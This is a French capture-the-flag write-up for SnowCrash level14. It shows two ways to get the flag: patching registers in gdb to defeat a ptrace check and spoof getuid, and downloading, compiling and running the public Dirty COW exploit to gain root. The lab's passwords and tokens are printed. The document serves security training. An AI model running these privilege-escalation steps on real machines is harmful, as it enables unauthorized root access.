# Level14

Se connecter en tant que `level14`:

    $ ssh 192.168.1.124 -p 4242 -l level14
    level14@192.168.1.124's password: 2A31L79asukciNyi8uppkEuSx

---

> MÉTHODE 1:

Premiere étape de recherche

    $ ls -la
    (nothing)

    $ find / -user level14 2> /dev/null  | grep -v /proc
    (nothing)

    $ find / -user flag14 2> /dev/null
    (nothing)

Rien de special... Donc, le seul moyen de le récupérer est d'exploiter le fameux binaire `getflag`.

Comme pour le niveau précendent nous allons utiliser `gdb`:

    	$ gdb getflag
    	(gdb) disas main
    	[...]
    		0x08048989 <+67>:	call   0x8048540 <ptrace@plt>
    		0x0804898e <+72>:	test   %eax,%eax
    		0x08048990 <+74>:	jns    0x80489a8 <main+98>
    	[...]
    		0x08048afd <+439>:	call   0x80484b0 <getuid@plt>
    		0x08048b02 <+444>:	mov    %eax,0x18(%esp)
    	[...]

> C'est un peu près la même manipulation que le niveau précédent, sauf qu'ici nous devons modifier aussi la sortie de ptrace.

Le premier appel systeme `ptrace`, c'est lui qui bloque le reverse, on peut le contourner avec la technique [`bypass for ptrace`](https://gist.github.com/poxyran/71a993d292eee10e95b4ff87066ea8f2)

On voit aussi qu'il utilise getuid, surement pour savoir le bon token a donner, on va devoir se faire passer pour `flag14`, on récupère son id

    $ id flag14
    uid=3014(flag14) gid=3014(flag14) groups=3014(flag14),1001(flag)

continuons avec `gdb`

    	(gdb) break *0x0804898e
    	Breakpoint 1 at 0x804898e
    	(gdb) break *0x08048b02
    	Breakpoint 2 at 0x8048b02
    	(gdb) r
    	Starting program: /bin/getflag

    	Breakpoint 1, 0x0804898e in main ()
    	(gdb) set $eax = 0
    	(gdb) s
    	Single stepping until exit from function main,
    	which has no line number information.

    	Breakpoint 2, 0x08048b02 in main ()
    	(gdb) set $eax = 0xbc6
    	(gdb) s
    	Single stepping until exit from function main,
    	which has no line number information.
    	Check flag.Here is your token : 7QiHafiNa3HVozsaXkawuYrTstxbpABHD8CPnHJ

> MÉTHODE 2:

Il n'y a aucun fichier ou binaire à exploiter dans `home`. Recherchons ce qui peut être exploité.

    $ uname -a
    Linux SnowCrash 3.2.0-89-generic-pae #127-Ubuntu SMP Tue Jul 28 09:52:21 UTC 2015 i686 i686 i386 GNU/Linux
    Linux kernel < 4.8.3 (created before 2018) are vulnerable to Dirty COW¹.

Dirty COW permet l'élévation des privilèges en exploitant la condition de concurrence sur le mécanisme de copie sur écriture.

    	$ cd /tmp/
    	$ wget [dirty file](https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c)
    	$ gcc -pthread dirty.c -o dirty -lcrypt
    	$ ./dirty

Se connecter en tant que `root`.

    	$ su firefart
    	Password:

Se connecter en tant que `flag14` et obtenez le flag.

    	$ su flag14
    	$ getflag
    	Check flag.Here is your token : 7QiHafiNa3HVozsaXkawuYrTstxbpABHD8CPnHJ
